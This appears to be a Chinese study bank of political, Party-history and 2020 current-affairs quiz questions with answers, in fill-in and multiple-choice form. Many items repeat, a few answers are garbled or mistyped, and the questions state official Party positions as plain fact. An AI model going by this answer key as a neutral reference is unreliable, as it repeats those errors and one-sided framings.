<p>我党第一次独立自主地运用马列主义基本原理，解决自己的路线、方针和政策的会议是（ ）</p>
<p>遵义会议</p>
<p>1945年（ ），日本代表在投降书上签字，日局128万人向中国投降至此，中国抗日战争顺利结束，世界反法西斯战争也胜利结束。</p>
<p>9月2日</p>
<p>2014年8月31日 十二届全国人大常委会第十次会议通过《关于设立烈士纪念日的决定》，将（ ）设立为烈士纪念日。</p>
<p> 9月30日 </p>
<p>中国共产党第十九届中央委员会第（）次全体会议26日上午在京召开。中央委员会总书记习近平代表中央政治局向全会作工作报告，并就《中共中央关于制定国民经济和社会发展第十四个五年规划和二〇三五年远景目标的建议(讨论稿)》向全会作了说明。</p>
<p>五</p>
<p>（）卫生部10月11日公布的新冠疫情数据显示，该国累计确诊病例突破700万例，成为继美国之后，全球第二个累计确诊病例数超过700万例的国家。</p>
<p>印度</p>
<p>2020年7月21日，（）5G智能电网实验网项目日前建设完工，这个目前国内规模最大的5G智能电网实验网，成功实现5G智能分布式配电、变电站作业监护及电网态势感知、5G基站削峰填谷供电等多个新应用。</p>
<p>青岛</p>
<p>2020年10月26日至29日，中国共产党第十九届中央委员会第五次全体会议在北京举行。全会认为，当今世界正经历百年未有之大变局，新一轮科技革命和产业变革深入发展，国际力量对比深刻调整，（ ）仍然是时代主题，人类命运共同体理念深入人心，同时国际环境日趋复杂，不稳定性不确定性明显增加。</p>
<p>和平与发展</p>
<p>2013年3月17日，习近平在十二届全国人大一次会议闭幕会上讲话指出，实现中华民族伟大复兴的中国梦，就是要实现（ ）。实现中国梦，必须走中国道路、弘扬中国精神、凝聚中国力量。</p>
<p>国家富强、民族振兴、人民幸福</p>
<p>1994年9月28日，中共十四届四中全会通过《关于加强党的建设几个重大问题的决定》，把党的建设提到新的（ ）的高度。</p>
<p>伟大工程</p>
<p>第一次国共合作的政治基础是（ ）</p>
<p>新三民主义</p>
<p>1992年11月，海峡两岸关系协会与台湾海峡交流基金会，就解决两岸事务性商谈中如何表述坚持一个中国原则的问题，达成（ ）的共识，后称为“九二共识”。</p>
<p>“海峡两岸均坚持一个中国原则”</p>
<p>我党第一次独立自主地运用马列主义基本原理，解决自己的路线、方针和政策的会议是（ ）</p>
<p>遵义会议</p>
<p>2020年两会期间，最高检发布报告显示，1999年至2019年，（）取代盗窃成我国第一刑事犯罪。</p>
<p>醉驾</p>
<p>财政部、海关总署、税务总局发布公告，自2020年7月1日起，调整海南离岛旅客免税购物政策，对注册在海南自由贸易港并实质性运营的鼓励类产业企业，减按（）的税率征收企业所得税。</p>
<p>15%</p>
<p>中国国际服务贸易交易会，是专门为服务贸易搭建的国家级、国际性、综合型大规模展会和交易平台，自2012年起，已举办（）届。</p>
<p>6</p>
<p>1920年8月，陈独秀等领导建立的中国最早的共产党组织是（ ）</p>
<p>上海共产主义小组</p>
<p>2020年5月7日，（）通过生态环境部组织的国家生态省建设试点验收，建成中国首个生态省。</p>
<p>浙江省</p>
<p>2020年4月24日，中国首次火星探测任务被命名为“（）”</p>
<p>天问一号</p>
<p>当今国际形势的突出特点：世界（）不可逆转。世界走向多极化，是时代进步的要求，符合各国人民的利益，有利于世界和平与发展。人民生活生产随着国际交流的日益深化，受到不同程度的影响。国际形势是世界发展不可绕过的观察重点。</p>
<p>多极化</p>
<p>2020年5月18日，国家主席习近平在第73届世界卫生大会视频会议开幕式上发表题为（）的致辞。</p>
<p> “团结合作战胜疫情，共同构建人类卫生健康共同体”</p>
<p>2020年4月14日，（）宣布将暂停资助世界卫生组织。当前全球疫情形势严峻，这一决定将削弱世卫组织能力，损害全球抗疫合作。</p>
<p>美国</p>
<p>1964年1月27日，中国同（ ）建交，成为第一个与新中国正式建交的西方大国。</p>
<p>法国</p>
<p>中国特色社会主义进入新时代，我国社会主要矛盾转化为（ ）</p>
<p>人民日益增长的美好生活需要和不平衡不充分的发展之间的矛盾。</p>
<p>党的十九届五中全会高度评价决胜全面建成小康社会取得的决定性成就。“十三五”时期，（ ），全面依法治国取得重大进展，全面从严治党取得重大成果，国家治理体系和治理能力现代化加快推进，中国共产党领导和我国社会主义制度优势进一步彰显。</p>
<p>全面深化改革取得重大突破</p>
<p>党的十九届五中全会高度评价决胜全面建成小康社会取得的决定性成就。经济实力、科技实力、综合国力跃上新的大台阶，经济运行总体平稳，经济结构持续优化，预计二〇二〇年国内生产总值突破（ ）亿元。</p>
<p>一百万</p>
<p>党的十九届五中全会强调全党全国各族人民要再接再厉、一鼓作气，确保如期打赢脱贫攻坚战，确保如期全面建成小康社会、实现（ ），为开启全面建设社会主义现代化国家新征程奠定坚实基础。</p>
<p>第一个一百年奋斗目标</p>
<p>2020年7月15日，（）互联网法院跨境贸易法庭正式成立，这是全国首个集中审理跨境数字贸易纠纷案件的人民法庭。</p>
<p>杭州</p>
<p>2017年10月18日，党的十九大隆重开幕。党的十九大的主题是：不忘初心，（ ），高举中国特色社会主义伟大旗帜，决胜全面建成小康社会，夺取新时代中国特色社会主义伟大胜利，为实现中华民族伟大复兴的中国梦不懈奋斗。</p>
<p>牢记使命</p>
<p>2020年8月24日，日本首相安倍晋三自第二届内阁成立以来的连续在任天数达到2799日，超过前首相（），成为日本连续执政时间最长的首相。</p>
<p>佐藤荣作</p>
<p>“千古奇冤，江南一叶，同室操戈，相煎何急？”是周恩来在（ ）后对国民党蒋介石的控诉和回击。</p>
<p>皖南事变</p>
<p>2020年5月1日，世界卫生组织表示，确定新冠病毒源自（）。</p>
<p>自然界</p>
<p>中国特色社会主义制度的根本政治制度是（ ）</p>
<p>人民代表大会制度</p>
<p>1945年，党的（ ）确立了毛泽东思想为全党的指导思想。</p>
<p>七大</p>
<p>十九大提出，从2035年到本世纪中叶，在基本实现现代化的基础上，再奋斗15年，把我国建成（ ）。</p>
<p>富强民主文明和谐美丽的社会主义现代化强国</p>
<p>社会主义改造基本完成后，党和全国人民的主要任务是（ ）。</p>
<p>尽快地把我国从落后的农业国变为先进的工业国</p>
<p>2020年10月26日至29日，中国共产党第十九届中央委员会第五次全体会议在北京举行。全会深入分析了我国发展环境面临的深刻复杂变化，认为当前和今后一个时期，我国发展仍然处于（ ），但机遇和挑战都有新的发展变化。</p>
<p>重要战略机遇期</p>
<p>新文化运动兴起的标志是（ ）</p>
<p>陈独秀在上海创办《青年杂志》</p>
<p>标志着中国共产党开始独立领导革命战争和创建人民军队的事件是（ ）。</p>
<p>南昌起义</p>
<p>党的十九届五中全会高度评价决胜全面建成小康社会取得的决定性成就。（ ）成果举世瞩目，五千五百七十五万农村贫困人口实现脱贫。</p>
<p>脱贫攻坚</p>
<p>抗日战争胜利后，国共双方举行了最高级别谈判，双方代表签署了《政府与中共代表会谈纪要》，这就是历史上著名的（ ）。</p>
<p>重庆谈判</p>
<p>2016年1月16日，亚投行正式开业。4年多来，亚投行按照多边开发银行模式和原则运作，坚持国际性、规范性、高标准，实现良好开局。从最初（）个创始成员携手起航，发展到今天的来自亚洲、欧洲、非洲、北美洲、南美洲、大洋洲等六大洲的（）个成员齐聚一堂，亚投行不断发展壮大，已经为成员提供了近200亿美元的基础设施投资。</p>
<p>57；102</p>
<p>2020年5月21日，美国宣布，计划6个月后正式退出（），美方此举不利于保持地区国家间军事互信和透明，不利于维护有关地区的安全与稳定，对国际军控与裁军进程也将产生消极影响。</p>
<p>《开放天空条约》</p>
<p>1922年召开的中共二大第一次明确提出了（ ）</p>
<p>反帝反封建的民主革命纲领</p>
<p>2020年10月26日至29日，中国共产党第十九届中央委员会第五次全体会议在北京举行。全会认为，当今世界正经历百年未有之大变局，新一轮科技革命和产业变革深入发展，国际力量对比深刻调整，（ ）仍然是时代主题，人类命运共同体理念深入人心，同时国际环境日趋复杂，不稳定性不确定性明显增加。</p>
<p>和平与发展</p>
<p>标志着中国新民主主义革命开端的历史事件是（ ）。</p>
<p> 五四运动</p>
<p>念五四运动100周年大会上的重要讲话中，习主席指出：“当代中国,爱国主义的本质就是坚持（ ）高度统一。 </p>
<p>爱党爱国爱社会主义</p>
<p>2020年5月28日，十三届全国人大三次会议表决通过了《中华人民共和国民法典》，自（）起施行。</p>
<p>21 1 1</p>
<p>党的十九届五中全会高度评价决胜全面建成小康社会取得的决定性成就。“十三五”时期，（ ），全面依法治国取得重大进展，全面从严治党取得重大成果，国家治理体系和治理能力现代化加快推进，中国共产党领导和我国社会主义制度优势进一步彰显。</p>
<p>全面深化改革取得重大突破</p>
<p>（ ）从组织上确立了党对军队的绝对领导，为建立一支无产阶级领导下的新型人民军队奠定了基础。</p>
<p>三湾改编</p>
<p>社会主义改造基本完成后，党和全国人民的主要任务是（ ）。</p>
<p>尽快地把我国从落后的农业国变为先进的工业国</p>
<p>中国共产党第十九届中央委员会第（）次全体会议26日上午在京召开。中央委员会总书记习近平代表中央政治局向全会作工作报告，并就《中共中央关于制定国民经济和社会发展第十四个五年规划和二〇三五年远景目标的建议(讨论稿)》向全会作了说明。</p>
<p>五</p>
<p>1994年9月28日，中共十四届四中全会通过《关于加强党的建设几个重大问题的决定》，把党的建设提到新的（ ）的高度。</p>
<p>伟大工程</p>
<p>2020年8月24日，日本首相安倍晋三自第二届内阁成立以来的连续在任天数达到2799日，超过前首相（），成为日本连续执政时间最长的首相。</p>
<p>佐藤荣作</p>
<p>2020年是中缅建交（）周年。</p>
<p>70</p>
<p>1945年，党的（ ）确立了毛泽东思想为全党的指导思想。</p>
<p>七大</p>
<p>2013年3月17日，习近平在十二届全国人大一次会议闭幕会上讲话指出，实现中华民族伟大复兴的中国梦，就是要实现（ ）。实现中国梦，必须走中国道路、弘扬中国精神、凝聚中国力量。</p>
<p>国家富强、民族振兴、人民幸福</p>
<p>中国国际服务贸易交易会，是专门为服务贸易搭建的国家级、国际性、综合型大规模展会和交易平台，自2012年起，已举办（）届。</p>
<p>6</p>
<p>2020年10月26日至29日，中国共产党第十九届中央委员会第五次全体会议在北京举行。全会深入分析了我国发展环境面临的深刻复杂变化，认为当前和今后一个时期，我国发展仍然处于（ ），但机遇和挑战都有新的发展变化。</p>
<p>重要战略机遇期</p>
<p>标志着中国共产党开始独立领导革命战争和创建人民军队的事件是（ ）。</p>
<p>南昌起义</p>
<p>中国特色大国外交理念的核心价值观，是蕴含着中华民族传统文化中“（）”的思想情怀的，是符合人类文明中崇尚和平友善的普遍诉求的。</p>
<p>天下为公</p>
<p>2020年5月28日，十三届全国人大三次会议表决通过了《中华人民共和国民法典》，自（）起施行。</p>
<p>2021年1月1日 </p>
<p>（）是近代以来中国人民反抗外敌入侵持续时间最长、规模最大、牺牲最多的民族解放斗争，也是第一次取得完全胜利的民族解放斗争。</p>
<p>中国人民抗日战争</p>
<p>2020年4月24日，中国首次火星探测任务被命名为“（）”</p>
<p>天问一号</p>
<p>1945年（ ），日本代表在投降书上签字，日局128万人向中国投降至此，中国抗日战争顺利结束，世界反法西斯战争也胜利结束。</p>
<p>9月2日</p>
<p>2020年7月21日，（）5G智能电网实验网项目日前建设完工，这个目前国内规模最大的5G智能电网实验网，成功实现5G智能分布式配电、变电站作业监护及电网态势感知、5G基站削峰填谷供电等多个新应用。</p>
<p>青岛</p>
<p>1956年4月，毛泽东发表（ ），初步提出了中国社会主义建设的基本方针，就是要把国外一切积极因素调动起来，为社会主义事业服务。</p>
<p>《论十大关系》</p>
<p>实现中国梦必须弘扬中国精神。这就是以（ ）为核心的民族精神，以（ ）为核心的时代精神。</p>
<p>爱国主义，改革创新</p>
<p>1964年1月27日，中国同（ ）建交，成为第一个与新中国正式建交的西方大国。</p>
<p>法国</p>
<p>十九大提出，从2035年到本世纪中叶，在基本实现现代化的基础上，再奋斗15年，把我国建成（ ）。</p>
<p>富强民主文明和谐美丽的社会主义现代化强国</p>
<p>2020年8月，（）开始了实质性施工，这是世界首座设计时速350公里单洞双线高铁海底隧道，它的施工也标志着中国高铁建设向海域隧道领域迈出了坚实的一步。</p>
<p>汕头湾海底隧道</p>
<p>1928年6月，在莫斯科举行的是中国共产党第（ ）次全国代表大会。</p>
<p>六</p>
<p>1950年6月朝鲜战争爆发，10月19日以（ ）为司令员兼政治委员的中国人民志愿局奉命开赴朝鲜战场。</p>
<p>彭德怀</p>
<p>第一次国共合作的政治基础是（ ）</p>
<p>新三民主义</p>
<p>习近平在2020年中国国际服务贸易交易会全球服务贸易峰会上致辞强调各国要共同营造开放包容的合作环境、共同激活创新引领的合作动能、共同开创互利共赢的合作局面，中国将坚定不移扩大对外开放，继续放宽服务业市场准入，发展服务贸易新业态新模式，支持组建全球服务贸易联盟，支持北京打造国家服务业扩大开放综合示范区，带动形成更高层次（）。</p>
<p>改革开放新格局</p>
<p>1956年召开的中共八大指出，党和全国人民当前的主要任务是（ ）</p>
<p>把我国从落后的农业国变为先进的工业国</p>
<p>1988年，中共中央、国务院决定建立的经济特区是（ ）。</p>
<p>海南经济特区</p>
<p>财政部、海关总署、税务总局发布公告，自2020年7月1日起，调整海南离岛旅客免税购物政策，对注册在海南自由贸易港并实质性运营的鼓励类产业企业，减按（）的税率征收企业所得税。</p>
<p>15%</p>
<p>邓小平在（ ）上第一次提出了“建设有中国特色的社会主义”的崭新命题。</p>
<p>党的十二大</p>
<p>新中国颁布的第一部法律是（ ）。</p>
<p>《婚姻法》</p>
<p>党的十九届五中全会高度评价决胜全面建成小康社会取得的决定性成就。（ ）成果举世瞩目，五千五百七十五万农村贫困人口实现脱贫。</p>
<p>脱贫攻坚</p>
<p>2020年7月8日，国务院港澳事务办公室发表声明表示，依照《中华人民共和国香港特别行政区维护国家安全法》有关规定，中央人民政府驻香港特别行政区（）成立。</p>
<p>维护国家安全公署</p>
<p>1935年12月，中共中央在（ ）上确定了抗日民族统一战线的策略方针。</p>
<p>瓦窑堡会议</p>
<p>2020年5月18日，国家主席习近平在第73届世界卫生大会视频会议开幕式上发表题为（）的致辞。</p>
<p> “团结合作战胜疫情，共同构建人类卫生健康共同体”</p>
<p>2019年5月31日， “不忘初心、牢记使命”主题教育工作会议召开。习近平在会议上讲话指出，要牢牢把握（ ）的总要求。</p>
<p>守初心、担使命，找差距、抓落实</p>
<p>2020年两会期间，最高检发布报告显示，1999年至2019年，（）取代盗窃成我国第一刑事犯罪。</p>
<p>醉驾</p>
<h1 id="多选"><a href="#多选" class="headerlink" title="多选"></a>多选</h1><p>2020年9月22日，联合国秘书长古特雷斯指出，当今世界面临挑战有（）。</p>
<p>新冠疫情全球大流行</p>
<p>数字世界黑暗面</p>
<p>全球互不信任</p>
<p>气候危机</p>
<p>地缘紧张局势</p>
<p>2020年10月26日至29日，中国共产党第十九届中央委员会第五次全体会议在北京举行。全会提出，坚持（ ）在我国现代化建设全局中的核心地位，把 （ ）自立自强作为国家发展的战略支撑。</p>
<p>科技</p>
<p>创新</p>
<p>习近平新时代中国特色社会主义思想的历史地位是（）</p>
<p>实现中华民族伟大复兴的行动指南</p>
<p>新时代的精神旗帜</p>
<p>马克思主义中国化最新成果</p>
<p>新冠肺炎疫情暴发以来，亚投行迅速行动，成立了应急基金，支持成员应对疫情和恢复经济，充分体现了亚投行的行动力。全球抗击新冠肺炎疫情的实践表明，人类是休戚与共、风雨同舟的命运共同体，唯有相互支持、团结合作才是战胜危机的人间正道。解决经济全球化进程中出现的矛盾，各国应该努力形成（）的全球治理、（）的多边机制、（）的区域合作。</p>
<p>更加积极</p>
<p>更加有效</p>
<p>更加包容</p>
<p>2020年6月18日，《中华人民共和国香港特别行政区维护国家安全法（草案）》由十三届全国人大常委会第十九次会议审议，其中，草案对防范、制止和惩治发生在香港特别行政区的（）等犯罪行为的具体构成和相应的刑事责任，作出了明确规定。</p>
<p>恐怖活动</p>
<p>颠覆国家政权</p>
<p>分裂国家</p>
<p>勾结外国或者境外势力危害国家安全</p>
<p>要学习“四史”，守住中国共产党创立的社会主义伟大事业。其中“四史”为（ ）。</p>
<p>党史</p>
<p>改革开放史</p>
<p>新中国史</p>
<p>社会主义发展史</p>
<p>毛泽东在《（共产党人）发刊词》一文中总结的中国革命的三大法宝是（ ）。</p>
<p>统一战线</p>
<p>武装斗争</p>
<p>党的建设</p>
<p>毛泽东提出的“工农武装割据”的基本内容是（ ）</p>
<p>农村根据地建设</p>
<p>土地革命</p>
<p>武装斗争</p>
<p>1979年3月30日 邓小平在党的理论工作务虚会上作《坚持四项基本原则》的讲话。指出，必须在思想政治上坚持四项基本原则：（ ），这是实现四个现代化的根本前提。</p>
<p>必须坚持共产党的领导</p>
<p>必须坚持无产阶级专政</p>
<p>必须坚持社会主义道路</p>
<p>必须坚持马列主义、毛泽东思想</p>
<p>2020年4月,国务院于批准，海南省三沙市设立（）。 </p>
<p>南沙区</p>
<p>西沙区</p>
<p>邓小平在1992年南方谈话中明确指出，社会主义的本质是（ ）。</p>
<p>最终达到共同富裕</p>
<p>解放生产力，发展生产力</p>
<p>消除两极分化</p>
<p>消灭剥削</p>
<p>10月7日2020年诺贝尔化学奖奖揭晓获奖名单，（）共同获奖。</p>
<p>珍妮弗·道德纳</p>
<p>埃玛纽埃勒·沙尔庞捷</p>
<p>2020年8月11日，国家主席习近平签署主席令，授予（）“共和国勋章”，授予（）、（）、（）“人民英雄”国家荣誉称号。</p>
<p>钟南山</p>
<p>陈薇</p>
<p>张伯礼</p>
<p>张定宇</p>
<p>党的十九届五中全会提出了“十四五”时期经济社会发展指导思想和必须遵循的原则，其中包括：协调推进 （ ）、 （ ） 、（ ） 、全面从严治党的战略布局等。</p>
<p>全面深化改革</p>
<p>全面依法治国</p>
<p>全面建设现代化国家</p>
<p>要学习“四史”，守住中国共产党创立的社会主义伟大事业。其中“四史”为（ ）。</p>
<p>改革开放史</p>
<p>党史</p>
<p>新中国史</p>
<p>社会主义发展史</p>
<p>毛泽东在《论联合政府》中提出的党的三大作风是（ ）。</p>
<p>自我批评</p>
<p>和人民群众密切地联系在一起</p>
<p>理论和实践相结合</p>
<p>21世纪初我国周边安全战略的基本架构可以用“（），（），经略东南，斗而不破，”来勾画。</p>
<p>强固后背</p>
<p>稳定两翼</p>
<p>2020年10月26日至29日，中国共产党第十九届中央委员会第五次全体会议在北京举行。全会提出，“十四五”时期经济社会发展“以 （ ）为主题，以 （ ）主线，以（ ）为根本动力，以（ ）为根本目的”。</p>
<p>推动高质量发展</p>
<p>深化供给侧结构性改革</p>
<p>满足人民日益增长的美好生活需要</p>
<p>改革创新</p>
<p>金砖国家合作机制成立以来，合作基础日益夯实，领域逐渐拓展，已经形成以领导人会晤为导向，以安全事务高级代表会议、外长会晤等部长级会议为支撑，在（）、财金、（）、农业、文化、教育、卫生、智库、友城等数十个领域开展务实合作的多层次架构。</p>
<p>经贸</p>
<p>科技</p>
<p>毛泽东提出的“工农武装割据”的基本内容是（ ）</p>
<p>武装斗争</p>
<p>农村根据地建设</p>
<p>土地革命</p>
<p>2020年10月26日至29日，中国共产党第十九届中央委员会第五次全体会议在北京举行。全会提出，繁荣发展文化事业和文化产业，提高国家文化软实力。坚持 （ ）在意识形态领域的指导地位，坚定 （ ） ，坚持以 （ ） 引领文化建设，加强社会主义精神文明建设。</p>
<p>马克思主义</p>
<p>文化自信</p>
<p>社会主义核心价值观</p>
<p>习近平总书记在中央外事工作会议上指出，把握国际形势要树立正确的（）、（）、（）。</p>
<p>角色观</p>
<p>大局观</p>
<p>历史观</p>
<p>10月6日2020年诺贝尔物理学奖揭晓获奖名单，（）共同获奖。</p>
<p>安德里亚·格兹</p>
<p>罗杰·彭罗斯</p>
<p>莱因哈德·根泽尔</p>
<p>1979年3月30日 邓小平在党的理论工作务虚会上作《坚持四项基本原则》的讲话。指出，必须在思想政治上坚持四项基本原则：（ ），这是实现四个现代化的根本前提。</p>
<p>必须坚持无产阶级专政</p>
<p>必须坚持马列主义、毛泽东思想</p>
<p>必须坚持共产党的领导</p>
<p>必须坚持社会主义道路</p>
<p>2020年6月11日，嫦娥四号任务团队优秀代表中国探月工程总设计师（），中国探月工程副总设计师（），嫦娥四号任务探测器系统总设计师（），获得国际宇航联合会2020年度最高奖——“世界航天奖”。这也是该国际组织成立70年来首次把这一奖项授予中国航天科学家。</p>
<p>孙泽洲</p>
<p>吴伟仁</p>
<p>于登云</p>
<p>1928年4月，毛泽东将过去陆续提出的工农纪律和注意事项归纳为“三条纪律”和“六项注意”，后来发展为“三大纪律八项注意”，体现了新型人民军队的本质，是我军的光荣传统之一。其中三大纪律内容是（）</p>
<p>一切行动听指挥</p>
<p>不拿群众一针一线</p>
<p>一切缴获要归公</p>
<p>我国已经进入实现中华民族伟大复兴的关键阶段，国际国内新形势要求我们要善于与时俱进、审时度势地进行战略调整，善于（）、（）。</p>
<p>化危为机</p>
<p>转危为安</p>
<p>抗美援朝战争胜利60多年来，在中国共产党坚强领导下，中国发生了前所未有的历史巨变，中国特色社会主义进入了新时代，中华民族迎来了从（）、（）到（）的伟大飞跃。</p>
<p>站起来</p>
<p>强起来</p>
<p>富起来</p>
<p>2020年10月26日至29日，中国共产党第十九届中央委员会第五次全体会议在北京举行。全会提出了到二〇三五年基本实现社会主义现代化远景目标，其中包括：建成文化强国、教育强国、（ ）、 （ ）、 （ ），国民素质和社会文明程度达到新高度，国家文化软实力显著增强等。</p>
<p>健康中国</p>
<p>体育强国</p>
<p>人才强国</p>
<p>2020年9月8日，习近平在全国抗击新冠肺炎疫情表彰大会上发表重要讲话，讲话中指出，在这场同严重疫情的殊死较量中，中国人民和中华民族以敢于斗争、敢于胜利的大无畏气概，铸就了（）的伟大抗疫精神。</p>
<p>生命至上</p>
<p>举国同心</p>
<p>舍生忘死</p>
<p>命运与共</p>
<p>尊重科学</p>
<p>中共十一届三中全会深远的历史意义主要体现在（全选　）</p>
<p>毛泽东在党的七届二中全会上提出，务必使同志们保持（ ）。</p>
<p>谦虚、谨慎、不骄、不躁的作风</p>
<p>艰苦奋斗的作风</p>
<p>2020年10月26日至29日，中国共产党第十九届中央委员会第五次全体会议在北京举行。全会强调，实现“十四五”规划和二〇三五年远景目标，必须坚持（ ），充分调动 （ ），广泛团结 （ ），形成（ ）。</p>
<p>党的全面领导</p>
<p>团结一切可以团结的力量</p>
<p>一切积极因素</p>
<p>推动发展的强大合力</p>
<p>2020年5月，世卫组织已启动“获得抗击新冠肺炎工具加速器”国际合作倡议，以加速新冠疫苗、诊断和治疗工具的（）。</p>
<p>研发</p>
<p>生产</p>
<p>公平分配</p>
<p>中国特色大国外交要求我们继续要高举（）、（）、（）、（）的旗帜。</p>
<p>合作</p>
<p>共赢</p>
<p>和平</p>
<p>发展</p>
<p>中共十九大报告中提出，要支持香港、澳门融入国家发展大局，以（）等为重点，全面推进内地同香港、澳门互利合作。</p>
<p>粤港澳合作</p>
<p>粤港澳大湾区建设</p>
<p>泛珠三角区域合作</p>
<p>习近平在第三次中央新疆工作座谈会上强调，坚持（），努力建设新时代中国特色社会主义新疆。</p>
<p>长期建疆</p>
<p>文化润疆</p>
<p>富民兴疆</p>
<p>团结稳疆</p>
<p>依法治疆</p>
<p>五四运动的历史特点和意义体现在（ ）</p>
<p>促进了马克思主义在中国的广泛传播</p>
<p>是中国新民主主义革命的开端</p>
<p>是一场真正的群众性运动</p>
<p>是一次彻底反帝反封建的运动</p>
<p>毛泽东在党的七届二中全会上提出，务必使同志们保持（ ）。</p>
<p>艰苦奋斗的作风</p>
<p>谦虚、谨慎、不骄、不躁的作风</p>
<p>2020年10月26日至29日，中国共产党第十九届中央委员会第五次全体会议在北京举行。全会强调，实现“十四五”规划和二〇三五年远景目标，必须坚持（ ），充分调动 （ ），广泛团结 （ ），形成（ ）。</p>
<p>党的全面领导</p>
<p>一切积极因素</p>
<p>团结一切可以团结的力量</p>
<p>推动发展的强大合力</p>
<p>我国已经进入实现中华民族伟大复兴的关键阶段，国际国内新形势要求我们要善于与时俱进、审时度势地进行战略调整，善于（）、（）。</p>
<p>转危为安</p>
<p>化危为机</p>
<p>金砖国家合作机制成立以来，合作基础日益夯实，领域逐渐拓展，已经形成以领导人会晤为导向，以安全事务高级代表会议、外长会晤等部长级会议为支撑，在（）、财金、（）、农业、文化、教育、卫生、智库、友城等数十个领域开展务实合作的多层次架构。</p>
<p>科技</p>
<p>经贸</p>
<p>习近平总书记在中央外事工作会议上指出，把握国际形势要树立正确的（）、（）、（）。</p>
<p>历史观</p>
<p>角色观</p>
<p>大局观</p>
<p>抗美援朝战争胜利60多年来，在中国共产党坚强领导下，中国发生了前所未有的历史巨变，中国特色社会主义进入了新时代，中华民族迎来了从（）、（）到（）的伟大飞跃。</p>
<p>富起来</p>
<p>站起来</p>
<p>强起来</p>
<p>邓小平在1992年南方谈话中明确指出，社会主义的本质是（ ）。</p>
<p>最终达到共同富裕</p>
<p>消灭剥削</p>
<p>解放生产力，发展生产力</p>
<p>消除两极分化</p>
<p>2020年10月26日至29日，中国共产党第十九届中央委员会第五次全体会议在北京举行。全会提出，繁荣发展文化事业和文化产业，提高国家文化软实力。坚持 （ ）在意识形态领域的指导地位，坚定 （ ） ，坚持以 （ ） 引领文化建设，加强社会主义精神文明建设。</p>
<p>社会主义核心价值观</p>
<p>文化自信</p>
<p>马克思主义</p>
<p>毛泽东提出的“工农武装割据”的基本内容是（ ）</p>
<p>农村根据地建设</p>
<p>土地革命</p>
<p>武装斗争</p>
<p>21世纪初我国周边安全战略的基本架构可以用“（），（），经略东南，斗而不破，”来勾画。</p>
<p>稳定两翼</p>
<p>强固后背</p>
<p>党的十九届五中全会提出了“十四五”时期经济社会发展指导思想和必须遵循的原则，其中包括：协调推进 （ ）、 （ ） 、（ ） 、全面从严治党的战略布局等。</p>
<p>全面依法治国</p>
<p>全面深化改革</p>
<p>全面建设社会主义现代化国家</p>
<p>2020年6月11日，嫦娥四号任务团队优秀代表中国探月工程总设计师（），中国探月工程副总设计师（），嫦娥四号任务探测器系统总设计师（），获得国际宇航联合会2020年度最高奖——“世界航天奖”。这也是该国际组织成立70年来首次把这一奖项授予中国航天科学家。</p>
<p>于登云</p>
<p>吴伟仁</p>
<p>孙泽洲</p>
<p>党的十九届五中全会提出了“十四五”时期经济社会发展主要目标，其中包括：社会文明程度得到新提高，（ ）深入人心，人民思想道德素质、科学文化素质和 （ ）明显提高，公共文化服务体系和 （ ） 更加健全， （ ）日益丰富，中华文化影响力进一步提升，中华民族凝聚力进一步增强。</p>
<p>社会主义核心价值观</p>
<p>身心健康素质</p>
<p>文化产业体系</p>
<p>人民精神文化生活</p>
<p>毛泽东在《论联合政府》中提出的党的三大作风是（ ）。</p>
<p>理论和实践相结合</p>
<p>和人民群众密切地联系在一起</p>
<p>自我批评</p>
<p>抗美援朝战争期间，志愿军将士面对强大而凶狠的作战对手，身处恶劣而残酷的战场环境，抛头颅、洒热血，涌现出了（）等30多万名英雄功臣和近6000个功臣集体。</p>
<p>黄继光</p>
<p>邱少云</p>
<p>杨根思</p>
<p>2020年9月8日，习近平在全国抗击新冠肺炎疫情表彰大会上发表重要讲话，讲话中指出，在这场同严重疫情的殊死较量中，中国人民和中华民族以敢于斗争、敢于胜利的大无畏气概，铸就了（）的伟大抗疫精神。</p>
<p>舍生忘死</p>
<p>生命至上</p>
<p>尊重科学</p>
<p>举国同心</p>
<p>命运与共</p>
<p>五四运动的历史特点和意义体现在（ ）</p>
<p>是一次彻底反帝反封建的运动</p>
<p>是中国新民主主义革命的开端</p>
<p>是一场真正的群众性运动</p>
<p>促进了马克思主义在中国的广泛传播</p>
<p>习近平在第三次中央新疆工作座谈会上强调，坚持（），努力建设新时代中国特色社会主义新疆。</p>
<p>依法治疆</p>
<p>富民兴疆</p>
<p>团结稳疆</p>
<p>长期建疆</p>
<p>文化润疆</p>
<p>1979年3月30日 邓小平在党的理论工作务虚会上作《坚持四项基本原则》的讲话。指出，必须在思想政治上坚持四项基本原则：（ ），这是实现四个现代化的根本前提。</p>
<p>必须坚持马列主义、毛泽东思想</p>
<p>必须坚持共产党的领导</p>
<p>必须坚持无产阶级专政</p>
<p>必须坚持社会主义道路</p>
<p>中国特色大国外交要求我们继续要高举（）、（）、（）、（）的旗帜。</p>
<p>共赢</p>
<p>和平</p>
<p>发展</p>
<p>合作</p>
<p>2020年10月26日至29日，中国共产党第十九届中央委员会第五次全体会议在北京举行。全会提出了到二〇三五年基本实现社会主义现代化远景目标，其中包括：建成文化强国、教育强国、（ ）、 （ ）、 （ ），国民素质和社会文明程度达到新高度，国家文化软实力显著增强等。</p>
<p>人才强国</p>
<p>健康中国</p>
<p>体育强国</p>
<p>中国人民政治协商会议第一届全体会议于9月21日至30日举行。会议选举毛泽东为中央人民政府主席，朱德、刘少奇、（ ）为副主席。</p>
<p>李济深</p>
<p>张澜</p>
<p>宋庆龄</p>
<p>高岗</p>
<p>中共十九大报告中提出，要支持香港、澳门融入国家发展大局，以（）等为重点，全面推进内地同香港、澳门互利合作。</p>
<p>粤港澳大湾区建设</p>
<p>粤港澳合作</p>
<p>泛珠三角区域合作</p>
<p>2020年10月26日至29日，中国共产党第十九届中央委员会第五次全体会议在北京举行。全会提出，坚持（ ）在我国现代化建设全局中的核心地位，把 （ ）自立自强作为国家发展的战略支撑。</p>
<p>创新</p>
<p>科技</p>
<p>要学习“四史”，守住中国共产党创立的社会主义伟大事业。其中“四史”为（ ）。</p>
<p>社会主义发展史</p>
<p>新中国史</p>
<p>党史</p>
<p>改革开放史</p>
<p>毛泽东在《（共产党人）发刊词》一文中总结的中国革命的三大法宝是（ ）。</p>
<p>统一战线</p>
<p>武装斗争</p>
<p>党的建设</p>
<p>2020年10月23日，习近平在纪念中国人民志愿军抗美援朝出国作战70周年大会上发表重要讲话，讲话指出，在波澜壮阔的抗美援朝战争中，英雄的中国人民志愿军始终发扬（）,锻造了伟大抗美援朝精神。</p>
<p>祖国和人民利益高于一切、为了祖国和民族的尊严而奋不顾身的爱国主义精神</p>
<p>英勇顽强、舍生忘死的革命英雄主义精神</p>
